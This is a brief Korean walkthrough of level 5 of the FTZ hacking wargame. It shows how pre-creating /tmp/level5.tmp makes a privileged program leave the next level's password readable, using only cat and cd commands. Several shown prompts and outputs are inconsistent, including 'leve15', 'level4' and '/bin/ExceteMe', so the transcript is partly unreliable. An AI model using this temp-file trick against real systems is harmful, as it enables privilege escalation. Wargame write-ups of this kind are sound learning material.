## level5

#### 실행

``` //
[level5@ftz levl5]$ cat hint // hint 파일의 내용을 화면에 출력한다.
```

#### 결과

```
/usr/bin/level5 프로그램은 /tmp 디렉토리에
level5.tmp 라는 이름의 임시파일을 생성한다.

이를 이용하여 level6의 권한을 얻어라.
```

--------

#### 실행

```
[leve15@ftz level5]$ cd /tmp // 경로로 현재 위치를 변경한다.
```

#### 결과

```/bin/ExceteMe
[leve15@ftz tmp]$
```

---------

#### 실행

```
[level5@ftz tmp]$ cat > level5.tmp
something (ctrl + d)
// level5.tmp 파일을 만들어 something을 쓴다.
```

#### 결과

```
[level5@ftz tmp]$
```

-------------------

#### 실행

```
[level5@ftz tmp]$ cd /usr/bin
[level5@ftz bin]$ ./level5
```

#### 결과

```
[level4@ftz bin]$
```

----------------

#### 실행

```
[level4@ftz bin]$ cd /tmp
[level5@ftz tmp]$ cat level5.tmp
```

/usr/bin/level5는 임시 파일이 없을 경우 생성하지만, 이미 임시 파일이 있으므로 덮어쓰기한다.

덮어쓰기 후 임시파일을 삭제하려고 하였으나, 파일의 권한이 level5이므로 level6권한인 /usr/bin/level5에서 삭제하지 못하고 종료된다.

#### 결과

```
next password : what the hell
```

